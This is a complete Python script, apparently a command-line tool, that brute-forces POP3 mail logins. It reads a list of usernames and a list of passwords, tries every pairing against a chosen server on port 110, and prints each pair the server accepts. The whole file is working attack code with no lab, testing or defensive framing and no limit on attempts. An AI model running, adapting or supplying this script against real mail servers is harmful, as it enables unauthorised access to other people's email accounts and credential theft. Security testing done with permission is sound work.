import sys
import socket

def test_pop3_login(server, user, password):
    port = 110
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((server, port))
        response = sock.recv(1024).decode('utf-8')

        if not response.startswith('+OK'):
            print(f"Error: {response}")
            sock.close()
            return

        sock.send(f"USER {user}\r\n".encode('utf-8'))
        response = sock.recv(1024).decode('utf-8')

        if not response.startswith('+OK'):
            print(f"Error sending user {user}: {response}")
            sock.close()
            return

        sock.send(f"PASS {password}\r\n".encode('utf-8'))
        response = sock.recv(1024).decode('utf-8')

        if "+OK" in response:
            print("\n\n+++++++++++++++++++++++++++++")
            print(f"Success: {user}:{password}")
            print("+++++++++++++++++++++++++++++\n\n")
        elif "Temporary authentication failure" in response:
            print(f"Failed {user}:{password}")
        else:
            print(f"Unknown error {user}:{password}: {response}")

        sock.close()
    except Exception as e:
        print(f"Error connecting to server {server} for user {user}: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Uso: python3 script.py <server> <userlist> <passlist>")
        sys.exit(1)

    server = sys.argv[1]
    userlist_file = sys.argv[2]
    passlist_file = sys.argv[3]

    try:
        with open(userlist_file, 'r') as user_file:
            users = [line.strip() for line in user_file.readlines()]

        with open(passlist_file, 'r') as pass_file:
            passwords = [line.strip() for line in pass_file.readlines()]

        for user in users:
            for password in passwords:
                test_pop3_login(server, user, password)
    except FileNotFoundError as e:
        print(f"File not found: {e}")
    except Exception as e:
        print(f"Error: {e}")
